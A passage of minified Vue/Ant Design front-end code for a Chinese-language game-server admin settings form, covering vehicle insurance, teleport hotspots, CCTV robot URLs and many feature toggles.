layerToTargetPlaceLocation,callback:function(t){e.$set(e.settingsForm,"TeleportStarterPlayerToTargetPlaceLocation",t)},expression:"settingsForm.TeleportStarterPlayerToTargetPlaceLocation"}})],1),i("a-form-model-item",{attrs:{label:"新人入服传送延迟(s)",prop:"TeleportStarterPlayerToTargetPlaceDelay"}},[i("a-input-number",{attrs:{min:0,disabled:!e.edit||!0!==e.settingsForm.EnableTeleportStarterPlayerToTargetPlace},model:{value:e.settingsForm.TeleportStarterPlayerToTargetPlaceDelay,callback:function(t){e.$set(e.settingsForm,"TeleportStarterPlayerToTargetPlaceDelay",t)},expression:"settingsForm.TeleportStarterPlayerToTargetPlaceDelay"}})],1),i("a-form-model-item",{attrs:{label:"启用载具保险(排除滴滴车)",prop:"EnableVehicleEnsurance"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableVehicleEnsurance,callback:function(t){e.$set(e.settingsForm,"EnableVehicleEnsurance",t)},expression:"settingsForm.EnableVehicleEnsurance"}})],1),i("a-form-model-item",{attrs:{label:"载具保险配置",prop:"VehicleEnsuranceConfigs"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.VehicleEnsuranceConfigs.push({name:"1分钟有效保险",activeMinutes:0,activeMinutesDescription:"0分钟",expireMinutes:1,expireMinutesDescription:"1分钟",price:1e3,benifit:5e3,limitedItemIds:[]})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.VehicleEnsuranceConfigs?"up":"down"},on:{click:function(){e.$set(e.expander,"VehicleEnsuranceConfigs",!e.expander.VehicleEnsuranceConfigs)}}},[e._v(e._s(e.expander.VehicleEnsuranceConfigs?"隐藏":"显示"))])],1),e.expander.VehicleEnsuranceConfigs?e._l(e.settingsForm.VehicleEnsuranceConfigs,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("名称:")]),i("a-input",{staticStyle:{width:"calc(100% - 200px)"},attrs:{disabled:!e.edit,placeholder:"请输入名称(不能重复)"},model:{value:t.name,callback:function(i){e.$set(t,"name",i)},expression:"VehicleEnsurance.name"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.VehicleEnsuranceConfigs.splice(a,1)}}},[e._v("移除")])],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("反悔期(分钟):")]),i("a-input-number",{staticStyle:{width:"calc(100% - 130px)"},attrs:{min:0,disabled:!e.edit},model:{value:t.activeMinutes,callback:function(i){e.$set(t,"activeMinutes",i)},expression:"VehicleEnsurance.activeMinutes"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("反悔期描述文案:")]),i("a-input",{staticStyle:{width:"calc(100% - 130px)"},attrs:{disabled:!e.edit},model:{value:t.activeMinutesDescription,callback:function(i){e.$set(t,"activeMinutesDescription",i)},expression:"VehicleEnsurance.activeMinutesDescription"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("有效期(分钟):")]),i("a-input-number",{staticStyle:{width:"calc(100% - 130px)"},attrs:{min:1,disabled:!e.edit},model:{value:t.expireMinutes,callback:function(i){e.$set(t,"expireMinutes",i)},expression:"VehicleEnsurance.expireMinutes"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("有效期描述文案:")]),i("a-input",{staticStyle:{width:"calc(100% - 130px)"},attrs:{disabled:!e.edit},model:{value:t.expireMinutesDescription,callback:function(i){e.$set(t,"expireMinutesDescription",i)},expression:"VehicleEnsurance.expireMinutesDescription"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("价格(美金):")]),i("a-input-number",{staticStyle:{width:"calc(100% - 130px)"},attrs:{disabled:!e.edit,min:1,placeholder:"请输入价格"},model:{value:t.price,callback:function(i){e.$set(t,"price",i)},expression:"VehicleEnsurance.price"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("出险赔付(美金):")]),i("a-input-number",{staticStyle:{width:"calc(100% - 130px)"},attrs:{disabled:!e.edit,min:1,placeholder:"请输入出险赔付"},model:{value:t.benifit,callback:function(i){e.$set(t,"benifit",i)},expression:"VehicleEnsurance.benifit"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("商品ID(选填):")]),i("a-select",{staticStyle:{width:"calc(100% - 130px)"},attrs:{mode:"tags",disabled:!e.edit,"token-separators":[","," "]},model:{value:t.limitedItemIds,callback:function(i){e.$set(t,"limitedItemIds",i)},expression:"VehicleEnsurance.limitedItemIds"}})],1)])})):e._e()],2),i("a-form-model-item",{attrs:{label:"热点区域传送坐标",prop:"HotPointTeleportPoint"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.HotPointTeleportPoint.push({name:"",description:"",location:["",""]})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.HotPointTeleportPoint?"up":"down"},on:{click:function(){e.$set(e.expander,"HotPointTeleportPoint",!e.expander.HotPointTeleportPoint)}}},[e._v(e._s(e.expander.HotPointTeleportPoint?"隐藏":"显示"))])],1),e.expander.HotPointTeleportPoint?e._l(e.settingsForm.HotPointTeleportPoint,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("名称:")]),i("a-input",{staticStyle:{width:"calc(100% - 180px)"},attrs:{disabled:!e.edit,placeholder:"请输入名称(不能重复)"},model:{value:t.name,callback:function(i){e.$set(t,"name",i)},expression:"HotPoint.name"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.HotPointTeleportPoint.splice(a,1)}}},[e._v("移除")])],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("描述:")]),i("a-input",{staticStyle:{width:"calc(100% - 100px)"},attrs:{disabled:!e.edit},model:{value:t.description,callback:function(i){e.$set(t,"description",i)},expression:"HotPoint.description"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("坐标:")]),e._v(" 从 "),i("a-input",{staticStyle:{width:"calc((100% - 145px) / 2)"},attrs:{disabled:!e.edit,placeholder:"请输入坐标"},model:{value:t.location[0],callback:function(i){e.$set(t.location,0,i)},expression:"HotPoint.location[0]"}}),e._v(" 到 "),i("a-input",{staticStyle:{width:"calc((100% - 145px) / 2)"},attrs:{disabled:!e.edit,placeholder:"请输入坐标"},model:{value:t.location[1],callback:function(i){e.$set(t.location,1,i)},expression:"HotPoint.location[1]"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("价格(美金):")]),i("a-input-number",{staticStyle:{width:"calc(100% - 100px)"},attrs:{disabled:!e.edit,min:0,placeholder:"请输入价格"},model:{value:t.price,callback:function(i){e.$set(t,"price",i)},expression:"HotPoint.price"}})],1)])})):e._e()],2),i("a-form-model-item",{attrs:{label:"闭路电视配置",prop:"UserMonitorsConfig"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.UserMonitorsConfig.robots.push({name:"机器人"+(e.settingsForm.UserMonitorsConfig.robots.length+1),url:""})}}},[e._v("添加机器人 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.UserMonitorsConfigRobots?"up":"down"},on:{click:function(){e.$set(e.expander,"UserMonitorsConfigRobots",!e.expander.UserMonitorsConfigRobots)}}},[e._v(e._s(e.expander.UserMonitorsConfigRobots?"隐藏":"显示"))])],1),e.expander.UserMonitorsConfigRobots?e._l(e.settingsForm.UserMonitorsConfig.robots,(function(t,a){return i("div",{key:"robot"+a,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("名称:")]),i("a-input",{staticStyle:{width:"calc(100% - 180px)"},attrs:{disabled:!e.edit,placeholder:"请输入名称(不能重复)"},model:{value:t.name,callback:function(i){e.$set(t,"name",i)},expression:"robot.name"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.UserMonitorsConfig.robots.splice(a,1)}}},[e._v("移除")])],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("直播间URL:")]),i("a-input",{staticStyle:{width:"calc(100% - 100px)"},attrs:{disabled:!e.edit},model:{value:t.url,callback:function(i){e.$set(t,"url",i)},expression:"robot.url"}})],1)])})):e._e(),i("div",{staticStyle:{width:"100%","margin-top":"10px"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.UserMonitorsConfig.locations.push({description:"",locations:"",configs:{price:null,purchaseLimitOn:!1,time:0,each:""}})}}},[e._v("添加监控位置 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.UserMonitorsConfigLocations?"up":"down"},on:{click:function(){e.$set(e.expander,"UserMonitorsConfigLocations",!e.expander.UserMonitorsConfigLocations)}}},[e._v(e._s(e.expander.UserMonitorsConfigLocations?"隐藏":"显示"))])],1),e.expander.UserMonitorsConfigLocations?e._l(e.settingsForm.UserMonitorsConfig.locations,(function(t,a){return i("div",{key:"location"+a,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("描述:")]),i("a-input",{staticStyle:{width:"calc(100% - 180px)"},attrs:{disabled:!e.edit,placeholder:"请输入描述(不能重复)"},model:{value:t.description,callback:function(i){e.$set(t,"description",i)},expression:"location.description"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.UserMonitorsConfig.locations.splice(a,1)}}},[e._v("移除")])],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("坐标:")]),i("a-input",{staticStyle:{width:"calc(100% - 100px)"},attrs:{disabled:!e.edit,placeholder:"请输入坐标"},model:{value:t.locations,callback:function(i){e.$set(t,"locations",i)},expression:"location.locations"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("指定价格:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 160px)"},attrs:{min:0,placeholder:"置空则按照标准价格"},model:{value:t.configs.price,callback:function(i){e.$set(t.configs,"price",i)},expression:"location.configs.price"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{size:"small"},on:{click:function(e){t.configs.price=null}}},[e._v("置空")])],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("启用购买限制:")]),i("a-switch",{model:{value:t.configs.purchaseLimitOn,callback:function(i){e.$set(t.configs,"purchaseLimitOn",i)},expression:"location.configs.purchaseLimitOn"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("限制次数:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 100px)"},attrs:{disabled:!t.configs.purchaseLimitOn,min:0,placeholder:"置空则按照标准价格"},model:{value:t.configs.time,callback:function(i){e.$set(t.configs,"time",i)},expression:"location.configs.time"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("限制周期:")]),i("a-select",{staticStyle:{width:"calc(100% - 100px)",display:"inline-block"},attrs:{allowClear:"",disabled:!t.configs.purchaseLimitOn},model:{value:t.configs.each,callback:function(i){e.$set(t.configs,"each",i)},expression:"location.configs.each"}},e._l(e.purchaseLimitEachKeyValue,(function(a,n){return i("a-select-option",{key:n,attrs:{title:a,disabled:!t.configs.purchaseLimitOn}},[e._v(e._s(a))])})),1)],1)])})):e._e()],2),i("a-form-model-item",{attrs:{label:"免费热点区域传送次数(每用户)",prop:"HotZoneTeleportFreeTimes"}},[i("a-input-number",{attrs:{min:0,disabled:!e.edit},model:{value:e.settingsForm.HotZoneTeleportFreeTimes,callback:function(t){e.$set(e.settingsForm,"HotZoneTeleportFreeTimes",t)},expression:"settingsForm.HotZoneTeleportFreeTimes"}})],1),i("a-form-model-item",{attrs:{label:"消费美金会员积分设置"}},[i("div",{staticStyle:{border:"1px #aaaaaa dashed","border-radius":"4px"},attrs:{id:"member-ship-set"}},[i("a-form-model-item",{attrs:{label:"消费美金是否算入会员积分",prop:"EnablePurcahseAddMembershipPoints","label-col":{span:10},"wrapper-col":{span:14}}},[i("a-switch",{attrs:{disabled:!e.edit},on:{change:function(t){!1===t&&(e.settingsForm.EnableNonVipGainPurchasePoint=!1)}},model:{value:e.settingsForm.EnablePurcahseAddMembershipPoints,callback:function(t){e.$set(e.settingsForm,"EnablePurcahseAddMembershipPoints",t)},expression:"settingsForm.EnablePurcahseAddMembershipPoints"}})],1),i("a-form-model-item",{attrs:{label:"VIP0是否适用",prop:"EnableNonVipGainPurchasePoint","label-col":{span:10},"wrapper-col":{span:14}}},[i("a-switch",{attrs:{disabled:!e.edit||!0!==e.settingsForm.EnablePurcahseAddMembershipPoints},model:{value:e.settingsForm.EnableNonVipGainPurchasePoint,callback:function(t){e.$set(e.settingsForm,"EnableNonVipGainPurchasePoint",t)},expression:"settingsForm.EnableNonVipGainPurchasePoint"}})],1)],1)]),i("a-form-model-item",{attrs:{label:"可选功能开关"}},[i("div",{staticStyle:{border:"1px #aaaaaa dashed","border-radius":"4px"},attrs:{id:"enable-set"}},[i("a-form-model-item",{attrs:{label:"启用现金充值","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableCharge"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableCharge,callback:function(t){e.$set(e.settingsForm,"EnableCharge",t)},expression:"settingsForm.EnableCharge"}})],1),i("a-form-model-item",{attrs:{label:"开启每日登录福利","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableLoginSetEveryday"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableLoginSetEveryday,callback:function(t){e.$set(e.settingsForm,"EnableLoginSetEveryday",t)},expression:"settingsForm.EnableLoginSetEveryday"}})],1),i("a-form-model-item",{attrs:{label:"开启成就礼包","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableAchieveGift"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableAchieveGift,callback:function(t){e.$set(e.settingsForm,"EnableAchieveGift",t)},expression:"settingsForm.EnableAchieveGift"}})],1),i("a-form-model-item",{attrs:{label:"开启新手签到N日礼包","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableNDayGift"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableNDayGift,callback:function(t){e.$set(e.settingsForm,"EnableNDayGift",t)},expression:"settingsForm.EnableNDayGift"}})],1),i("a-form-model-item",{attrs:{label:"开启公益彩票","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableLottery"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableLottery,callback:function(t){e.$set(e.settingsForm,"EnableLottery",t)},expression:"settingsForm.EnableLottery"}})],1),i("a-form-model-item",{attrs:{label:"开启购买声望","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableFamePurchase"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableFamePurchase,callback:function(t){e.$set(e.settingsForm,"EnableFamePurchase",t)},expression:"settingsForm.EnableFamePurchase"}})],1),i("a-form-model-item",{attrs:{label:"开启离线信息发送","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableGameMessage"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableGameMessage,callback:function(t){e.$set(e.settingsForm,"EnableGameMessage",t)},expression:"settingsForm.EnableGameMessage"}})],1),i("a-form-model-item",{attrs:{label:"开启美金抽奖","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableGetPrize"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableGetPrize,callback:function(t){e.$set(e.settingsForm,"EnableGetPrize",t)},expression:"settingsForm.EnableGetPrize"}})],1),i("a-form-model-item",{attrs:{label:"开启转账功能","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableTransition"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableTransition,callback:function(t){e.$set(e.settingsForm,"EnableTransition",t)},expression:"settingsForm.EnableTransition"}})],1),i("a-form-model-item",{attrs:{label:"开启新手礼包购买","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableWelcomePackBuy"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableWelcomePackBuy,callback:function(t){e.$set(e.settingsForm,"EnableWelcomePackBuy",t)},expression:"settingsForm.EnableWelcomePackBuy"}})],1),i("a-form-model-item",{attrs:{label:"开启新手滴滴车购买","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableWelcomeDidiVehicleBuy"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableWelcomeDidiVehicleBuy,callback:function(t){e.$set(e.settingsForm,"EnableWelcomeDidiVehicleBuy",t)},expression:"settingsForm.EnableWelcomeDidiVehicleBuy"}})],1),i("a-form-model-item",{attrs:{label:"开启地图选点传送","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableMapSelectLocation"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableMapSelectLocation,callback:function(t){e.$set(e.settingsForm,"EnableMapSelectLocation",t)},expression:"settingsForm.EnableMapSelectLocation"}})],1),i("a-form-model-item",{attrs:{label:"开启购买玩家当前位置","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableUserLocationBuy"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableUserLocationBuy,callback:function(t){e.$set(e.settingsForm,"EnableUserLocationBuy",t)},expression:"settingsForm.EnableUserLocationBuy"}})],1),i("a-form-model-item",{attrs:{label:"开启队友传送","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableTeamTeleport"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableTeamTeleport,callback:function(t){e.$set(e.settingsForm,"EnableTeamTeleport",t)},expression:"settingsForm.EnableTeamTeleport"}})],1),i("a-form-model-item",{attrs:{label:"开启梁山好汉","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableSquadGather"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableSquadGather,callback:function(t){e.$set(e.settingsForm,"EnableSquadGather",t)},expression:"settingsForm.EnableSquadGather"}})],1),i("a-form-model-item",{attrs:{label:"开启购买改名卡","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableGameSetFakeName"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableGameSetFakeName,callback:function(t){e.$set(e.settingsForm,"EnableGameSetFakeName",t)},expression:"settingsForm.EnableGameSetFakeName"}})],1),i("a-form-model-item",{attrs:{label:"允许玩家购买商品","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableAllBuy"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableAllBuy,callback:function(t){e.$set(e.settingsForm,"EnableAllBuy",t)},expression:"settingsForm.EnableAllBuy"}})],1),i("a-form-model-item",{attrs:{label:"开启玩家位置曝光模式","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableLocationExpose"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableLocationExpose,callback:function(t){e.$set(e.settingsForm,"EnableLocationExpose",t)},expression:"settingsForm.EnableLocationExpose"}})],1),i("a-form-model-item",{attrs:{label:"开启多商品合并购买","label-col":{span:10},"wrapper-col":{span:14},prop:"EnablePurchaseMultiItem"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnablePurchaseMultiItem,callback:function(t){e.$set(e.settingsForm,"EnablePurchaseMultiItem",t)},expression:"settingsForm.EnablePurchaseMultiItem"}})],1),i("a-form-model-item",{attrs:{label:"开启多人购买排队","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableQueuePurchase"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableQueuePurchase,callback:function(t){e.$set(e.settingsForm,"EnableQueuePurchase",t)},expression:"settingsForm.EnableQueuePurchase"}})],1),i("a-form-model-item",{attrs:{label:"开启按照会员等级优先发货","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableVipPriority"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableVipPriority,callback:function(t){e.$set(e.settingsForm,"EnableVipPriority",t)},expression:"settingsForm.EnableVipPriority"}})],1),i("a-form-model-item",{attrs:{label:"开启实时击杀记录公开","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableRealtimeKillRecord"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableRealtimeKillRecord,callback:function(t){e.$set(e.settingsForm,"EnableRealtimeKillRecord",t)},expression:"settingsForm.EnableRealtimeKillRecord"}})],1),i("a-form-model-item",{attrs:{label:"开启服务器聊天记录公开","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableRealtimeChatMessageRecord"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableRealtimeChatMessageRecord,callback:function(t){e.$set(e.settingsForm,"EnableRealtimeChatMessageRecord",t)},expression:"settingsForm.EnableRealtimeChatMessageRecord"}})],1),i("a-form-model-item",{attrs:{label:"开启管理指令记录公开","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableRealtimeAdminCommandRecord"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableRealtimeAdminCommandRecord,callback:function(t){e.$set(e.settingsForm,"EnableRealtimeAdminCommandRecord",t)},expression:"settingsForm.EnableRealtimeAdminCommandRecord"}})],1),i("a-form-model-item",{attrs:{label:"开启违规日志记录公开","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableRealtimeViolationsRecordRecord"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableRealtimeViolationsRecordRecord,callback:function(t){e.$set(e.settingsForm,"EnableRealtimeViolationsRecordRecord",t)},expression:"settingsForm.EnableRealtimeViolationsRecordRecord"}})],1),i("a-form-model-item",{attrs:{label:"开启击杀图示展示","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableShowKillMap"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableShowKillMap,callback:function(t){e.$set(e.settingsForm,"EnableShowKillMap",t)},expression:"settingsForm.EnableShowKillMap"}})],1),i("a-form-model-item",{attrs:{label:"开启闭路电视","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableUserMonitors"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableUserMonitors,callback:function(t){e.$set(e.settingsForm,"EnableUserMonitors",t)},expression:"settingsForm.EnableUserMonitors"}})],1),i("a-form-model-item",{attrs:{label:"开启队伍购物","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableSquadBuy"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableSquadBuy,callback:function(t){e.$set(e.settingsForm,"EnableSquadBuy",t)},expression:"settingsForm.EnableSquadBuy"}})],1),i("a-form-model-item",{attrs:{label:"队伍购买不启用折扣","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableSquadBuyNoVip"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableSquadBuyNoVip,callback:function(t){e.$set(e.settingsForm,"EnableSquadBuyNoVip",t)},expression:"settingsForm.EnableSquadBuyNoVip"}})],1),i("a-form-model-item",{attrs:{label:"开启队伍金库","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableSquadDollar"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableSquadDollar,callback:function(t){e.$set(e.settingsForm,"EnableSquadDollar",t)},expression:"settingsForm.EnableSquadDollar"}})],1),e.enableSafezoneBuy?i("a-form-model-item",{attrs:{"label-col":{span:10},"wrapper-col":{span:14},prop:"EnablePurchaseSafeZone"}},[i("template",{slot:"label"},[i("span",[e._v("开启安全区域购买")]),i("a-tooltip",{attrs:{placement:"top",title:"需要配合新版机器人使用，开启该功能将会接管服务器的安全区设置"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnablePurchaseSafeZone,callback:function(t){e.$set(e.settingsForm,"EnablePurchaseSafeZone",t)},expression:"settingsForm.EnablePurchaseSafeZone"}})],2):e._e(),i("a-form-model-item",{attrs:{label:"把玩家传到自己埋的陷阱上","label-col":{span:10},"wrapper-col":{span:14},prop:"EnableTeleportPlayerToEquipedTrap"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableTeleportPlayerToEquipedTrap,callback:function(t){e.$set(e.settingsForm,"EnableTeleportPlayerToEquipedTrap",t)},expression:"settingsForm.EnableTeleportPlayerToEquipedTrap"}})],1),i("a-form-model-item",{attrs:{"label-col":{span:10},"wrapper-col":{span:14},prop:"EnableAutoFetchVehicleIdList"}},[i("template",{slot:"label"},[i("span",[e._v("每5分钟获取服务器载具列表")]),i("a-tooltip",{attrs:{placement:"top",title:"需要配合新版机器人使用，开启该设置会在一定程度上占用机器人的事件，请选择性能合适的云电脑或者添加机器人，如果要使用ID精准清理滴滴车或者载具保险功能，请务必打开"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableAutoFetchVehicleIdList,callback:function(t){e.$set(e.settingsForm,"EnableAutoFetchVehicleIdList",t)},expression:"settingsForm.EnableAutoFetchVehicleIdList"}})],2),i("a-form-model-item",{attrs:{"label-col":{span:10},"wrapper-col":{span:14},prop:"EnableAutoFetchPlayerLocationList"}},[i("template",{slot:"label"},[i("span",[e._v("每5分钟获取玩家位置列表")]),i("a-tooltip",{attrs:{placement:"top",title:"需要配合新版机器人使用，开启该设置会在一定程度上占用机器人的事件，请选择性能合适的云电脑或者添加机器人，如果要使用【实用工具集】-【玩家轨迹查询】功能，请务必打开"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableAutoFetchPlayerLocationList,callback:function(t){e.$set(e.settingsForm,"EnableAutoFetchPlayerLocationList",t)},expression:"settingsForm.EnableAutoFetchPlayerLocationList"}})],2)],1)]),e.enableSafezoneBuy?i("a-form-model-item",{attrs:{label:"每平方米安全区域5分钟价格",prop:"PurchaseSafeZonePricePerM2"}},[i("a-input-number",{attrs:{min:0,disabled:!e.edit},model:{value:e.settingsForm.PurchaseSafeZonePricePerM2,callback:function(t){e.$set(e.settingsForm,"PurchaseSafeZonePricePerM2",t)},expression:"settingsForm.PurchaseSafeZonePricePerM2"}})],1):e._e(),e.enableSafezoneBuy?i("a-form-model-item",{attrs:{label:"安全区列表",prop:"ServerSafeZones"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.ServerSafeZones.push({zoneType:"circle",centerXY:{x:"",y:""},radius:0,fromXY:{x:"",y:""},toXY:{x:"",y:""},expireTimeStamp:null})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.ServerSafeZones?"up":"down"},on:{click:function(){e.$set(e.expander,"ServerSafeZones",!e.expander.ServerSafeZones)}}},[e._v(e._s(e.expander.ServerSafeZones?"隐藏":"显示"))])],1),e.expander.ServerSafeZones?e._l(e.settingsForm.ServerSafeZones,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa 